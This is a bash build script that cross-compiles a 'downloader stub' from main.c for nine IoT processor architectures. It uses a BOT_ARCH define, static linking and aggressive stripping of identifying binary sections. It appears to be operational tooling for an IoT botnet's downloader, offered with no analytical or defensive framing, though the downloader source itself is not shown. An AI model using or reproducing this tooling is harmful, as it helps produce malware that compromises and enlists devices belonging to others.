#!/bin/bash
# ================================================================
#  dlr build script — cross-compile the downloader stub for
#  8+ IoT architectures.
#
#  Requires cross-compilers installed in /etc/xcompile/
#  (see scripts/cross-compile.sh for setup)
#
#  Output: ./release/dlr.<arch>
# ================================================================

set -e

CROSS_BASE="/etc/xcompile"
OUTDIR="./release"

# Architectures and their compiler prefixes
declare -A ARCHS=(
    ["arm"]="armv4l"
    ["arm7"]="armv7l"
    ["mips"]="mips"
    ["mpsl"]="mipsel"
    ["ppc"]="powerpc"
    ["sh4"]="sh4"
    ["spc"]="sparc"
    ["x86"]="i586"
    ["m68k"]="m68k"
)

mkdir -p "$OUTDIR"

echo "[*] building dlr stubs..."

for arch in "${!ARCHS[@]}"; do
    prefix="${ARCHS[$arch]}"
    cc="${CROSS_BASE}/${prefix}/bin/${prefix}-gcc"

    if [ ! -f "$cc" ]; then
        echo "    [!] skipping $arch — compiler not found: $cc"
        continue
    fi

    echo "    [$arch] compiling..."

    "$cc" -Os \
        -D BOT_ARCH=\"$arch\" \
        -static \
        -nostartfiles \
        -Wl,--gc-sections \
        -Wl,-s \
        -fdata-sections \
        -ffunction-sections \
        -o "$OUTDIR/dlr.$arch" \
        main.c

    # Strip aggressively.
    "${CROSS_BASE}/${prefix}/bin/${prefix}-strip" \
        --remove-section=.note.gnu.gold-version \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        --remove-section=.got.plt \
        --remove-section=.eh_frame \
        "$OUTDIR/dlr.$arch" 2>/dev/null || true

    size=$(stat -c%s "$OUTDIR/dlr.$arch" 2>/dev/null || stat -f%z "$OUTDIR/dlr.$arch" 2>/dev/null)
    echo "    [$arch] done — $size bytes"
done

echo "[+] all dlr binaries in $OUTDIR/"
ls -la "$OUTDIR/"
